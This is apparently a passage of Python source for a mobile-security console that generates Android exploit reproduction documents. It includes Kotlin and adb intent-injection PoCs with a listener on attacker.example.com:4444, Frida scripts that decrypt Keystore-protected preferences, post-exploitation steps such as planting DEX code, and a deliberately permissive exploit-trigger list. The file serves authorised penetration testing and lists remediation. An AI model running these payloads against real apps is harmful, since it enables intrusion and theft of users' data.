            for (key in attackKeys) {{
                try {{
                    val intent = Intent().apply {{
                        component = ComponentName("{_pkg(r)}", component)
                        putExtra(key, payload)
                        putExtra("action", "execute")
                    }}
                    if (component.endsWith("Receiver")) sendBroadcast(intent) else startService(intent)
                    log.append("  sent extra '$key' -> $payload\\n")
                }} catch (e: Exception) {{
                    log.append("  $key: ${{e.message}}\\n")
                }}
            }}
            root.addView(log)
        }}

        // Listen for the callback on attacker.example.com:4444 (nc -lvnp 4444)
        // If the target dispatches the cmd to Runtime.exec, you'll see the output appear there.
    }}
}}
```

# === STEP 5: ALTERNATIVE -- adb-only test (no app required) ===
# Service:
adb shell am startservice -n {_pkg(r)}/.SyncService \\
  --es cmd "id" --es command "id" --es exec "id"

# Broadcast:
adb shell am broadcast -n {_pkg(r)}/.RemoteCommandReceiver \\
  -a com.{_pkg(r).split('.')[1] if '.' in _pkg(r) else 'app'}.ACTION_EXECUTE \\
  --es script "id; getprop"

# === REMEDIATION (for the target) ===
# 1. android:exported="false" on services/receivers that don't need cross-app callers.
# 2. If exported, define a signature-level <permission> and require it.
# 3. NEVER pass Intent extras into Runtime.exec / ProcessBuilder / DexClassLoader.
# 4. Validate intent.getCallingPackage() against an allowlist."""},

    "android-keystore-bypass": {
        "title": "Android Keystore — Decryption Without User Auth Prompt",
        "explanation": (
            "Apps that use AndroidKeyStore but set setUserAuthenticationRequired(false) end up with "
            "a key that any process running as the app's UID can use. On a rooted device or via Frida, "
            "encrypted-at-rest tokens can be transparently decrypted -- you don't need to crack the "
            "ciphertext, you just call doFinal() and the OS hands you the plaintext."),
        "tags": ["keystore bypass", "androidkeystore", "encrypted prefs"],
        "build": lambda r: f"""# Android Keystore decrypt PoC -- target: {_pkg(r)}

# Goal: Use the app's own AndroidKeyStore key (which never leaves the TEE) to decrypt
# its EncryptedSharedPreferences without needing the user passcode.
# This works because the app didn't require user auth on its own key.

# === SETUP ===
# - Rooted device or Frida-Gadget injected APK
# - frida-tools installed

# === STEP 1: Find the alias the app uses ===
cat > find-alias.js <<'EOF'
Java.perform(() => {{
  const KS = Java.use('java.security.KeyStore');
  const orig = KS.getInstance.overload('java.lang.String');
  orig.implementation = function(t) {{
    console.log('[KeyStore.getInstance]', t);
    return orig.call(this, t);
  }};
  KS.getKey.overloads.forEach(o => {{
    o.implementation = function(alias, pw) {{
      console.log('[KeyStore.getKey] alias=' + alias);
      return o.apply(this, arguments);
    }};
  }});
}});
EOF
frida -U -f {_pkg(r)} -l find-alias.js --no-pause
# Exercise the app -- watch for getKey('master_key') or similar.

# === STEP 2: Decrypt encrypted shared prefs ===
# /data/data/{_pkg(r)}/shared_prefs/secret_shared_prefs.xml typically contains:
#   <string name="encrypted_value">BASE64_DATA</string>

cat > decrypt.js <<'EOF'
Java.perform(() => {{
  const ALIAS = '_androidx_security_master_key_';   // change to the alias you found
  const KS = Java.use('java.security.KeyStore').getInstance('AndroidKeyStore');
  KS.load(null);
  const key = KS.getKey(ALIAS, null);
  console.log('[+] Got key:', key.getAlgorithm());

  // Now intercept Cipher.doFinal() -- when the app decrypts,
  // print plaintext. Or call doFinal directly with the ciphertext from prefs.
  const Cipher = Java.use('javax.crypto.Cipher');
  Cipher.doFinal.overload('[B').implementation = function(data) {{
    const result = this.doFinal(data);
    const str = Java.use('java.lang.String').$new(result);
    console.log('[Plaintext]', str.toString().substring(0, 200));
    return result;
  }};
}});
EOF
frida -U -f {_pkg(r)} -l decrypt.js --no-pause

# === STEP 3: Direct decryption of an extracted blob (no live app needed) ===
# For this, the device must be rooted AND you must run code AS the app's UID:
adb root
adb shell run-as {_pkg(r)}
# Inside the run-as shell, write a tiny Java helper that opens AndroidKeyStore
# (only this UID can access the key)
# Or use objection:
objection --gadget {_pkg(r)} explore
# > android keystore export

# === REMEDIATION ===
# When generating the key: setUserAuthenticationRequired(true)
# Choose between BIOMETRIC and PASSWORD to suit your UX.
# For high-value secrets, also set setIsStrongBoxBacked(true)."""},
}


def _deeplink_drozer_lines(r):
    dl = (r.get("extras") or {}).get("deeplinks") or []
    if not dl:
        return "# (no deep links found in scan)"
    lines = []
    for d in dl[:5]:
        lines.append(f"run app.activity.start --action android.intent.action.VIEW --data-uri '{d.get('uri','')}'")
    return "\n".join(lines)


def _pkg(r):
    return r.get("metadata", {}).get("package", "com.example.app")


def _first_deeplink(r):
    dl = (r.get("extras") or {}).get("deeplinks") or []
    return dl[0].get("uri") if dl else None


def _first_authority(r):
    ec = (r.get("extras") or {}).get("exported_components") or []
    for c in ec:
        if c.get("tag") == "provider" and c.get("authorities"):
            return c["authorities"].split(";")[0].strip()
    return None


def _exported_activities_str(r):
    ec = (r.get("extras") or {}).get("exported_components") or []
    acts = [c.get("name") for c in ec
            if c.get("tag") in ("activity", "activity-alias") and c.get("name")]
    if not acts:
        return '"# No exported activities found in scan"'
    return " ".join(f'"{a}"' for a in acts[:8])


def _main_or_first_activity(r):
    m = r.get("metadata", {}) or {}
    if m.get("main_activity"):
        return m["main_activity"]
    acts = m.get("activities") or []
    return acts[0] if acts else "MainActivity"


def _deeplink_list_str(r):
    dl = (r.get("extras") or {}).get("deeplinks") or []
    if not dl:
        return "#   (no deep links found in scan)"
    return "\n".join(f"#   {d.get('uri','')}  ->  {d.get('activity','')}" for d in dl[:8])


def _secret_list_str(r):
    findings = r.get("findings") or []
    secrets = [f for f in findings
               if (f.get("id", "").startswith("secret-") or f.get("id", "").startswith("ios-secret-"))]
    if not secrets:
        return "#   (no hardcoded secrets found)"
    return "\n".join(f"#   {s.get('title','')}: {s.get('evidence','')[:90]}" for s in secrets[:6])


def _generate_exploit(query: str, report: dict) -> Optional[str]:
    """Enterprise-grade exploit generator. Returns a complete reproduction document for ANY
    exploit-generation query, with scan-aware fallbacks when no specific recipe matches.

    Triggering is deliberately permissive: any query that mentions exploiting, attacking,
    reproducing, demonstrating, or showing how something works will reach this function and
    produce a structured response. This avoids the previous behaviour where "I want exploit"
    fell through to the generic Q&A path.
    """
    q = query.lower().strip()
    if not q:
        return None

    # Don't engage on pure explanation requests -- those should fall through
    # to the explain/Q&A handler. Detect classic question stems that ask for
    # definition or background rather than reproduction.
    explain_only_stems = (
        "what is ", "what's ", "what are ", "what does ",
        "explain ", "tell me about ", "describe ",
        "summarise ", "summarize ",
    )
    if any(q.startswith(stem) for stem in explain_only_stems):
        # ...unless the explain stem is paired with an explicit "exploit"/"poc"/
        # "scenario" word, which means "explain how to exploit" -- still generate.
        if not any(w in q for w in ("exploit", "poc", "attack scenario", "reproduction")):
            return None

    # Permissive trigger detection. Any of these phrases (or single-word verbs near
    # 'exploit'/'attack'/'poc') will engage the generator.
    trigger_phrases = (
        "create", "generate", "build", "write", "make", "give me", "show me",
        "construct", "draft", "prepare", "produce", "craft",
        "i want", "i need", "want a", "need a", "want an", "need an",
        "how do i exploit", "how to exploit", "how would i exploit",
        "how do i attack", "how to attack", "how would i attack",
        "how do i abuse", "how to abuse",
        "how do i reproduce", "how to reproduce", "reproduce", "demonstrate",
        "walk me through", "step by step", "step-by-step",
        "exploit for", "exploit the", "exploit this", "poc for", "poc of",
        "proof of concept", "attack scenario", "exploitation", "exploit scenario",
        "write me", "show me an exploit",
    )
    has_trigger = any(p in q for p in trigger_phrases)
    # Also engage if the query contains obvious vulnerability vocabulary even without
    # a "create" verb, because users often shortcut: "sql injection exploit" or "xss poc"
    has_vuln_word = any(w in q for w in (
        "exploit", "attack", "vulnerability", "vulnerable", "payload", "poc",
        "rce", "sqli", "xss", "csrf", "ssrf", "lfi", "rfi", "idor",
        "injection", "bypass", "hijack", "spoof", "tampering",
    ))
    if not (has_trigger or has_vuln_word):
        return None

    pkg = _pkg(report)
    findings = report.get("findings", []) or []

    # ---- Match strategy 1: aliased keyword -> recipe ----
    # Each alias resolves to a recipe key. Using a flat lookup is faster and more
    # forgiving than scoring every recipe's tag list.
    ALIASES = {
        # SQL Injection
        "sqli": "sql-injection",
        "sql injection": "sql-injection",
        "sql-injection": "sql-injection",
        "sql": "sql-injection",
        "rawquery": "sql-injection",
        "union-based": "sql-injection",
        "blind sql": "sql-injection",
        # Exported activity / intent spoofing
        "exported activity": "exported-activity",
        "exported component": "exported-activity",
        "intent spoof": "exported-activity",
        "intent spoofing": "exported-activity",
        "activity hijack": "exported-activity",
        "exported": "exported-activity",
        # Deeplinks
        "deeplink": "deeplink",
        "deep link": "deeplink",
        "deep-link": "deeplink",
        "url scheme": "deeplink",
        "uri": "deeplink",
        "intent-filter": "deeplink",
        # WebView RCE
        "webview": "webview-rce",
        "addjavascriptinterface": "webview-rce",
        "javascript interface": "webview-rce",
        "javascriptinterface": "webview-rce",
        "addjs": "webview-rce",
        "rce": "webview-rce",
        "remote code execution": "webview-rce",
        # SSL/TLS bypass
        "trustmanager": "trustmanager-bypass",
        "trust manager": "trustmanager-bypass",
        "ssl pinning": "trustmanager-bypass",
        "tls pinning": "trustmanager-bypass",
        "certificate pinning": "trustmanager-bypass",
        "pinning bypass": "trustmanager-bypass",
        "mitm": "trustmanager-bypass",
        "ssl bypass": "trustmanager-bypass",
        # Hardcoded secrets
        "secret": "secrets",
        "secrets": "secrets",
        "api key": "secrets",
        "api keys": "secrets",
        "credential": "secrets",
        "credentials": "secrets",
        "leaked key": "secrets",
        "hardcoded": "secrets",
        # Intent redirection (OVAA pattern)
        "intent redirection": "intent-redirection",
        "intent forwarding": "intent-redirection",
        "ovaa": "intent-redirection",
        "intent redirect": "intent-redirection",
        # FileProvider / Dirty Stream
        "fileprovider": "fileprovider",
        "file provider": "fileprovider",
        "dirty stream": "fileprovider",
        "path traversal": "fileprovider",
        "content provider": "fileprovider",
        "cve-2024-0044": "fileprovider",
        # Frida runtime inspection
        "frida": "frida-runtime",
        "runtime trace": "frida-runtime",
        "runtime tracer": "frida-runtime",
        "runtime hook": "frida-runtime",
        "runtime inspect": "frida-runtime",
    }

    matched_key = None
    # Longest alias first so "intent spoofing" wins over "intent" alone
    for alias in sorted(ALIASES.keys(), key=len, reverse=True):
        if alias in q:
            matched_key = ALIASES[alias]
            break

    # Backward-compat: also score the original tag lists in case a tag isn't in ALIASES yet
    # Combined search across built-in + plugin recipes.
    all_recipes = dict(EXPLOIT_RECIPES)
    all_recipes.update(_PLUGIN_REGISTRY["exploit_recipes"])
    all_steps = dict(EXPLOIT_STEPS)
    all_steps.update(_PLUGIN_REGISTRY["exploit_steps"])
    all_reqs = dict(EXPLOIT_REQUIREMENTS)
    all_reqs.update(_PLUGIN_REGISTRY["exploit_requirements"])

    if matched_key is None:
        best, best_score = None, 0
        for key, recipe in all_recipes.items():
            score = sum(1 for tag in recipe.get("tags", []) if tag in q)
            if score > best_score:
                best_score = score
                best = key
        if best:
            matched_key = best

    # ---- Match strategy 2: a finding from the actual scan ----
    matched_finding = None
    for f in findings:
        fid = (f.get("id") or "").lower()
        title = (f.get("title") or "").lower()
        if fid and fid in q:
            matched_finding = f
            break
        title_words = {w for w in re.findall(r"\b[a-z]{4,}\b", title)
                       if w not in {"with", "from", "this", "that", "have", "been",
                                    "would", "could", "should", "vulnerability"}}
        q_words = set(re.findall(r"\b[a-z]{4,}\b", q))
        if len(title_words & q_words) >= 2:
            matched_finding = f
            break

    # ---- Decision ----
    if matched_key and matched_key in all_recipes:
        recipe = all_recipes[matched_key]
        return _build_enterprise_exploit(
            target_pkg=pkg,
            title=recipe["title"],
            explanation=recipe["explanation"],
            recipe_key=matched_key,
            poc_body=recipe["build"](report),
            steps=all_steps.get(matched_key, []),
            requirements=all_reqs.get(matched_key, []),
            finding=matched_finding,
            report=report,
        )
    elif matched_finding:
        return _build_finding_based_exploit(matched_finding, report, query)
    else:
        # Even with no recipe + no finding, the user clearly asked for an exploit.
        # Don't punish them with a blank template -- give a useful scenario walkthrough
        # built from the strongest finding we DO have in this scan.
        return _build_scenario_from_top_finding(report, query)


# =============================================================================
# Enterprise exploit-document generators.
# =============================================================================

def _cvss_severity(score):
    if score is None: return "—"
    if score >= 9.0: return "CRITICAL"
    if score >= 7.0: return "HIGH"
    if score >= 4.0: return "MEDIUM"
    if score >= 0.1: return "LOW"
    return "NONE"


RECIPE_ATTACK_MAPPING = {
    "sql-injection":      ("T1565.001", "Stored Data Manipulation"),
    "exported-activity":  ("T1626.001", "Abuse Elevation Control Mechanism"),
    "deeplink":           ("T1635.001", "Steal Application Access Token: URI Hijacking"),
    "webview-rce":        ("T1635",     "Steal Application Access Token"),
    "trustmanager-bypass":("T1521.003", "Encrypted Channel: SSL Pinning Bypass"),
    "secrets":            ("T1552.001", "Unsecured Credentials: Credentials In Files"),
    "intent-redirection": ("T1626",     "Abuse Elevation Control Mechanism"),
    "fileprovider":       ("T1533",     "Data from Local System"),
    "frida-runtime":      ("T1622",     "Debugger Evasion"),
}

RECIPE_CLASSIFICATION = {
    "sql-injection":      {"cwe": "CWE-89",  "cvss": 8.8, "masvs": "MSTG-PLATFORM-2",  "severity": "high"},
    "exported-activity":  {"cwe": "CWE-926", "cvss": 7.5, "masvs": "MSTG-PLATFORM-1",  "severity": "high"},
    "deeplink":           {"cwe": "CWE-939", "cvss": 6.5, "masvs": "MSTG-PLATFORM-3",  "severity": "medium"},
    "webview-rce":        {"cwe": "CWE-94",  "cvss": 8.6, "masvs": "MSTG-PLATFORM-7",  "severity": "high",
                           "cve": "CVE-2014-1939"},
    "trustmanager-bypass":{"cwe": "CWE-295", "cvss": 7.4, "masvs": "MSTG-NETWORK-3",   "severity": "high"},
    "secrets":            {"cwe": "CWE-798", "cvss": 7.5, "masvs": "MSTG-STORAGE-14",  "severity": "high"},
    "intent-redirection": {"cwe": "CWE-927", "cvss": 7.4, "masvs": "MSTG-PLATFORM-1",  "severity": "high"},
    "fileprovider":       {"cwe": "CWE-22",  "cvss": 7.8, "masvs": "MSTG-PLATFORM-3",  "severity": "high",
                           "cve": "CVE-2024-0044"},
    "frida-runtime":      {"cwe": "CWE-693", "cvss": 5.0, "masvs": "MSTG-RESILIENCE-4","severity": "medium"},
}


def _enterprise_header(pkg: str, title: str, classification: dict) -> str:
    cve = classification.get("cve", "")
    cvss = classification.get("cvss")
    cwe = classification.get("cwe", "")
    masvs = classification.get("masvs", "")
    severity = (classification.get("severity") or "").upper()
    cvss_str = f"{cvss:.1f} ({_cvss_severity(cvss)})" if cvss else "Not assigned"
    attack_id, attack_name = classification.get("attack", ("—", "—"))

    lines = [
        f"### {title}",
        "",
        "> **Classification & Metadata**",
        ">",
        "> | Field | Value |",
        "> |---|---|",
        f"> | Target | `{pkg}` |",
        f"> | Severity | **{severity or 'TBD'}** |",
        f"> | CVSS v3.1 | {cvss_str} |",
    ]
    if cve:
        lines.append(f"> | CVE | [{cve}](https://nvd.nist.gov/vuln/detail/{cve}) |")
    if cwe:
        cwe_num = cwe.split('-')[1] if '-' in cwe else cwe
        lines.append(f"> | CWE | [{cwe}](https://cwe.mitre.org/data/definitions/{cwe_num}.html) |")
    if masvs:
        lines.append(f"> | OWASP MASVS | {masvs} |")
    if attack_id and attack_id != "—":
        lines.append(f"> | MITRE ATT&CK | [{attack_id}](https://attack.mitre.org/techniques/{attack_id.replace('.', '/')}) — {attack_name} |")
    lines.append("> | Document type | Penetration test reproduction |")
    lines.append("")
    return "\n".join(lines)


def _build_enterprise_exploit(target_pkg, title, explanation, recipe_key,
                              poc_body, steps, requirements, finding, report):
    classification = dict(RECIPE_CLASSIFICATION.get(recipe_key, {}))
    classification["attack"] = RECIPE_ATTACK_MAPPING.get(recipe_key, ("—", "—"))

    if finding:
        if finding.get("cve"):  classification["cve"] = finding["cve"]
        if finding.get("cvss"): classification["cvss"] = finding["cvss"]
        if finding.get("cwe"):  classification["cwe"] = finding["cwe"]
        if finding.get("masvs"):classification["masvs"] = finding["masvs"]
        if finding.get("severity"): classification["severity"] = finding["severity"]

    out = []
    out.append(_enterprise_header(target_pkg, title, classification))

    out.append("---\n")
    out.append("#### 1. Executive summary\n")
    out.append(explanation)
    if finding and finding.get("evidence"):
        out.append("\n**Evidence captured during scan:**")
        out.append(f"```\n{finding['evidence'][:500]}\n```")
    out.append("")

    out.append("#### 2. Business impact\n")
    impact = (finding or {}).get("impact") or _impact_for_recipe(recipe_key)
    out.append(impact)
    out.append("")

    if requirements:
        out.append("#### 3. Preconditions & test environment\n")
        out.append("The following must be in place before reproduction begins:\n")
        for r in requirements:
            out.append(f"- {r}")
        out.append("\n**Recommended test environment:**")
        out.append("- Isolated test device or emulator (do NOT use a production device)")
        out.append("- Network capture tooling (mitmproxy / Burp Suite) on a separate workstation")
        out.append("- A tester account with appropriate authorisation documented in writing")
        out.append("")

    if steps:
        out.append("#### 4. Reproduction steps\n")
        out.append("Each step includes a verification gate. Do not proceed to the next step "
                   "until the current step's verify condition is met.\n")
        for i, step in enumerate(steps, 1):
            out.append(f"**Step {i} — {step['title']}**\n")
            out.append(step['detail'])
            if step.get('verify'):
                out.append(f"\n> **✓ Verify:** {step['verify']}")
            out.append("")

    out.append("#### 5. Proof-of-concept code\n")
    out.append("The block below is parameterised against the current scan target. "
               "Replace any `attacker.example.com` placeholder with a host you control before execution.\n")
    out.append(f"```bash\n{poc_body}\n```")
    out.append("")

    out.append("#### 6. Evidence collection\n")
    out.append("Capture the following artifacts during reproduction. They form the audit trail "
               "that supports the finding in the final report:\n")
    out.append("- Screen recording or screenshots showing the vulnerable behaviour before & after the payload")
    out.append("- Full HTTP traffic capture (Burp `.saz` / mitmproxy `.har`)")
    out.append("- Frida console output, timestamped (`frida ... 2>&1 | tee evidence-$(date +%s).log`)")
    out.append("- Logcat / syslog excerpt covering the test window")
    out.append("- SHA-256 of the APK / IPA tested (proves the version assessed)")
    out.append("")

    out.append("#### 7. Post-exploitation impact\n")
    out.append(_post_exploit_for_recipe(recipe_key))
    out.append("")

    out.append("#### 8. Cleanup\n")
    out.append("After the test, restore the device to a clean state:\n")
    out.append(f"```bash\nadb shell am force-stop {target_pkg}\n"
               f"adb shell pm clear {target_pkg}      # wipes app private data\n"
               f"adb uninstall {target_pkg}            # if you installed for this test only\n```")
    out.append("")

    out.append("#### 9. Remediation guidance\n")
    fix = (finding or {}).get("fix") or (finding or {}).get("recommendation") or _remediation_for_recipe(recipe_key)
    out.append(fix)
    out.append(f"\n**Recommended fix priority:** {_priority_for_severity(classification.get('severity'))}")
    out.append("")

    out.append("#### 10. References\n")
    refs = list((finding or {}).get("references") or [])
    refs.extend(_references_for_recipe(recipe_key))
    seen = set()
    for ref in refs:
        if ref and ref not in seen:
            out.append(f"- {ref}")
            seen.add(ref)
    out.append("- OWASP MASTG: https://mas.owasp.org/MASTG/")
    out.append("- OWASP MASVS: https://mas.owasp.org/MASVS/")
    out.append("")

    out.append("#### 11. Reproduction audit trail\n")
    scan_date = report.get("scan_date") or "—"
    ver = (report.get("metadata") or {}).get("version_name", "")
    out.append("| Field | Value |")
    out.append("| --- | --- |")
    out.append(f"| Target package | `{target_pkg}` |")
    if ver: out.append(f"| Target version | {ver} |")
    out.append(f"| Source scan date | {scan_date} |")
    out.append(f"| Document generated | {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M UTC')} |")
    out.append(f"| Tool | Vexa Security Console (rule-based generator) |")
    out.append(f"| Recipe key | `{recipe_key}` |")
    out.append("| Tester | _to be filled by the analyst_ |")
    out.append("| Authorisation reference | _engagement letter / scope document_ |")
    out.append("")

    out.append("---\n")
    out.append("**Legal & ethical notice:** Do not execute these procedures against any "
               "application, account, or environment for which you do not have explicit "
               "written authorisation. Unauthorised testing may violate computer-misuse laws.")

    return "\n".join(out)


def _build_finding_based_exploit(finding, report, query):
    """Enterprise document anchored to a specific finding from the scan."""
    pkg = _pkg(report)
    title = finding.get("title", "Untitled finding")
    classification = {
        "cve": finding.get("cve", ""),
        "cvss": finding.get("cvss"),
        "cwe": finding.get("cwe", ""),
        "masvs": finding.get("masvs", ""),
        "severity": finding.get("severity", "medium"),
        "attack": ("—", "—"),
    }

    out = []
    out.append(_enterprise_header(pkg, title, classification))
    out.append("---\n")
    out.append("#### 1. Executive summary\n")
    out.append(finding.get("description", "No description was captured during the scan."))
    out.append("")

    if finding.get("evidence"):
        out.append("**Evidence captured during scan:**")
        out.append(f"```\n{finding['evidence'][:500]}\n```\n")

    out.append("#### 2. Business impact\n")
    out.append(finding.get("impact") or
               "Refer to the CWE entry and the MASVS section for general impact guidance.")
    out.append("")

    out.append("#### 3. Preconditions\n")
    out.append("- Test device or emulator with the target app installed")
    out.append("- ADB on PATH for command-line interaction with the device")
    out.append("- Network MITM tooling (Burp / mitmproxy) if the finding involves traffic")
    out.append("- Frida + frida-server on the device if runtime instrumentation is required")
    out.append("")

    out.append("#### 4. Reproduction steps\n")
    out.append("This finding does not have a pre-built recipe. Standard manual-verification procedure:\n")

    out.append("**Step 1 — Confirm the static evidence**")
    out.append("Decompile the APK with `jadx-gui` and locate the code path matching the evidence. "
               "Confirm the construct is reachable from external input (exported component, deep link, "
               "network endpoint, or filesystem path).\n")
    out.append("> **✓ Verify:** You can identify a concrete entry point that reaches this code path.\n")

    out.append("**Step 2 — Set up a test environment**")
    out.append(f"```bash\nadb install <apk-file>\nadb shell am start -n {pkg}/.MainActivity\n```")
    out.append("> **✓ Verify:** App launches without crashing.\n")

    out.append("**Step 3 — Trigger the vulnerable code path**")
    cat = (finding.get("category") or "").upper()
    out.append(f"Based on the finding category (`{finding.get('category', 'unknown')}`), "
               f"trigger via the appropriate vector:\n")
    out.append("- **MASVS-STORAGE / CRYPTO**: pull `/data/data/<pkg>/` after using the app")
    out.append("- **MASVS-NETWORK**: capture traffic in Burp during normal app use")
    out.append("- **MASVS-PLATFORM**: send a crafted Intent / deep-link / content URI")
    out.append("- **MASVS-CODE**: provide malformed input that reaches the affected sink")
    out.append("- **MASVS-AUTH**: authenticate normally and capture session artifacts")
    out.append("- **MASVS-RESILIENCE**: attempt the bypass via Frida or a rooted device\n")
    out.append("> **✓ Verify:** You observe the vulnerable behaviour consistent with the finding's impact.\n")

    out.append("**Step 4 — Capture evidence**")
    out.append("Record video, save HTTP captures, dump prefs / databases, log Frida output. "
               "All evidence should be timestamped and SHA-256 hashed.\n")
    out.append("> **✓ Verify:** Audit trail is sufficient to reproduce without tester-specific knowledge.\n")

    out.append("#### 5. Proof-of-concept code\n")
    out.append("```bash")
    out.append(f"# Generic verification scaffold for finding: {finding.get('id', '?')}")
    out.append(f"# Target: {pkg}")
    out.append("")
    out.append(f"adb logcat -c && adb shell monkey -p {pkg} -c android.intent.category.LAUNCHER 1")
    out.append(f"adb logcat --pid=$(adb shell pidof {pkg}) | tee finding-evidence.log")
    out.append("")
    out.append("# Pull app data after exercising the affected feature:")
    out.append(f"adb root  # if test device permits")
    out.append(f"adb pull /data/data/{pkg}/ ./{pkg}-private/")
    out.append(f"grep -RIn -E '(token|password|secret|jwt|key)' ./{pkg}-private/")
    out.append("```")
    out.append("")

    out.append("#### 6. Evidence collection\n")
    out.append("- APK SHA-256: `sha256sum <apk-file>`")
    out.append("- Logcat capture during the test window")
    out.append("- Screen recording of the trigger and observed effect")
    out.append("- HTTP capture (Burp `.saz`) if network is involved")
    out.append("")

    out.append("#### 7. Remediation\n")
    out.append(finding.get("fix") or finding.get("recommendation") or
               "Refer to the CWE entry and MASVS control referenced in the header.")
    out.append(f"\n**Recommended fix priority:** {_priority_for_severity(classification['severity'])}")
    out.append("")

    out.append("#### 8. References\n")
    for ref in finding.get("references", []) or []:
        out.append(f"- {ref}")
    out.append("- OWASP MASTG: https://mas.owasp.org/MASTG/")
    out.append("- OWASP MASVS: https://mas.owasp.org/MASVS/")
    if classification.get("cve"):
        out.append(f"- NVD: https://nvd.nist.gov/vuln/detail/{classification['cve']}")
    out.append("")

    out.append("#### 9. Reproduction audit trail\n")
    out.append("| Field | Value |")
    out.append("| --- | --- |")
    out.append(f"| Finding ID | `{finding.get('id', '—')}` |")
    out.append(f"| Target package | `{pkg}` |")
    out.append(f"| Source scan date | {report.get('scan_date', '—')} |")
    out.append(f"| Document generated | {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M UTC')} |")
    out.append(f"| Confidence | {finding.get('confidence', 'unknown')} |")
    out.append("| Tester | _to be filled by the analyst_ |")
    out.append("")

    out.append("---\n")
    out.append("**Legal & ethical notice:** Test only on systems you have written authorisation to assess.")
    return "\n".join(out)


def _build_scenario_from_top_finding(report, query):
    """When neither a recipe tag nor a specific finding matches the query, pick the most
    severe finding from the scan and produce a scenario walkthrough for it. This keeps
    the AI Console useful instead of returning a blank template."""
    pkg = _pkg(report)
    findings = report.get("findings", []) or []
    sev_w = {"critical": 4, "high": 3, "medium": 2, "low": 1, "info": 0}
    sorted_f = sorted(findings, key=lambda f: -sev_w.get(f.get("severity", "info"), 0))

    if not sorted_f:
        # No findings at all -- give the user a high-level menu of what we CAN do
        avail_lines = []
        for key, recipe in EXPLOIT_RECIPES.items():
            tags = recipe.get("tags", [])
            sample = next((t for t in tags if " " in t or "-" in t), tags[0] if tags else key)
            avail_lines.append(f"- **{recipe['title']}** — try: `create exploit for {sample}`")

        return f"""### Exploit scenarios — no scan findings available

> The current scan has no findings, so there is no specific vulnerability to demonstrate.
> Vexa can still generate complete enterprise reproduction documents on demand for these
> common attack classes. Each is parameterised against your scan target (`{pkg}`).

#### Available recipes

{chr(10).join(avail_lines)}

#### How to use the AI Console for exploits

1. **Ask for a specific class**: "create an exploit for SQL injection"
2. **Reference a finding by ID**: "build a poc for finding `secret-aws-key`"
3. **Reference a finding by name**: "demonstrate the trustmanager issue"
4. **Ask for a scenario**: "show me how to abuse the WebView"
5. **Combine**: "step-by-step exploit for the deeplink bug"

Each query produces a structured 11-section enterprise document covering classification,
business impact, preconditions, reproduction steps, PoC code, evidence collection,
post-exploitation, cleanup, remediation, references, and audit trail.

---
**Tip**: try one of the example queries above and I'll generate the full document.
"""

    # Pick the top severity finding and produce a scenario for it
    top = sorted_f[0]
    return _build_finding_based_exploit(top, report, query)


# ---- Per-recipe enrichment ----

def _impact_for_recipe(key):
    return {
        "sql-injection":      "Full read access to the app's private SQLite database, including "
                              "user records, session tokens, and any locally cached PII. Write "
                              "access enables privilege escalation and tampered application state.",
        "exported-activity":  "Unauthenticated access to functionality that should require login. "
                              "Privilege escalation, account state tampering, leakage of sensitive "
                              "Activity output via crafted Intents.",
        "deeplink":           "One-click attack: a victim tapping a malicious link triggers app "
                              "actions on their behalf. Possible outcomes include data exposure, "
                              "auth-token theft via WebView injection, and application-state changes.",
        "webview-rce":        "Arbitrary code execution as the application's UID. Attacker reads "
                              "every file in the sandbox, every shared preference, and exfiltrates "
                              "credentials, session tokens, and biometric-protected data.",
        "trustmanager-bypass":"Plaintext capture of every network request and response: usernames, "
                              "passwords, session tokens, payment data, PII. Manipulation enables "
                              "response tampering and downstream attacks.",
        "secrets":            "Each leaked credential maps to a real-world impact: cloud account "
                              "takeover (AWS), financial loss (Stripe, Twilio), data exfiltration "
                              "(GitHub PAT, OpenAI key), or service abuse (Slack tokens).",
        "intent-redirection": "Privilege escalation by reaching internal components that were "
                              "explicitly marked `exported=false`. Common impacts include account "
                              "deletion, password reset, and access to debug menus.",
        "fileprovider":       "Cross-app file read OR write. Read enables theft of private databases "
                              "and shared preferences; write enables code execution by placing a "
                              "malicious DEX in the app's code_cache, or auth bypass by overwriting "
                              "shared preferences.",
        "frida-runtime":      "Runtime instrumentation reveals every network call, persisted secret, "
                              "and cryptographic operation. The exposed runtime model is the basis "
                              "for any subsequent dynamic exploit.",
    }.get(key, "Refer to the finding's impact field or the linked CWE entry.")


def _post_exploit_for_recipe(key):
    return {
        "sql-injection":      "After read access: dump the entire database, then attempt blind "
                              "extraction of additional columns via UNION. After write access: "
                              "test SQLite ATTACH DATABASE for arbitrary file write. Document "
                              "every table name and column name extracted.",
        "exported-activity":  "Enumerate every other exported component and chain attacks. "
                              "Document the role/permission state the Activity assumed (admin, "
                              "premium, etc.) and any PII surfaced.",
        "deeplink":           "Chain with WebView issues for full RCE if applicable. Attempt to "
                              "use the deep link from a third-party app's URI handler to bypass "
                              "user confirmation prompts.",
        "webview-rce":        "Read the entire app sandbox via the executed shell. Enumerate "
                              "accounts via `cat /data/system/users/0/accounts.db`. Persist via "
                              "writing to `code_cache/`. Pivot to other apps if shared user-id is set.",
        "trustmanager-bypass":"Capture an authenticated session, replay it from the attacker's "
                              "machine, and confirm server-side trust assumptions. Modify "
                              "responses (price, role, balance) to test client-side validation gaps.",
        "secrets":            "Validate scope: AWS keys → `aws iam get-account-summary`; OAuth "
                              "tokens → introspect endpoint. Estimate blast radius and coordinate "
                              "rotation with the credential's owner.",
        "intent-redirection": "Map every internal component reachable through the forwarder. "
                              "Demonstrate at least one privileged action that was previously "
                              "gated by `exported=false`.",
        "fileprovider":       "If write access is available, place a malicious DEX in code_cache "
                              "and trigger DexClassLoader. Otherwise, demonstrate read of "
                              "`shared_prefs/auth.xml` for session-token theft.",
        "frida-runtime":      "Use the runtime data to identify other vulnerabilities: weak "
                              "ciphers in flight, secrets being persisted, intents being "
                              "dispatched without validation.",
    }.get(key, "Document what was achieved and quantify the impact in business terms.")


def _remediation_for_recipe(key):
    return {
        "sql-injection":      "Replace string concatenation with parameterised queries: "
                              "`db.rawQuery(\"... WHERE id=?\", new String[]{userId})`. "
                              "Or use Room with `@Query` and bind variables.",
        "exported-activity":  "Set `android:exported=\"false\"` on every Activity that does not "
                              "need third-party access. For Activities that must remain exported, "
                              "validate every Intent extra against an allowlist before use.",
        "deeplink":           "Validate the host, path, and parameters of every incoming URI. "
                              "Reject `..`, absolute paths, and any host outside an allowlist. "
                              "Use App Links with autoVerify=true to claim the domain.",
        "webview-rce":        "Replace `addJavascriptInterface` with `WebMessageListener` (added "
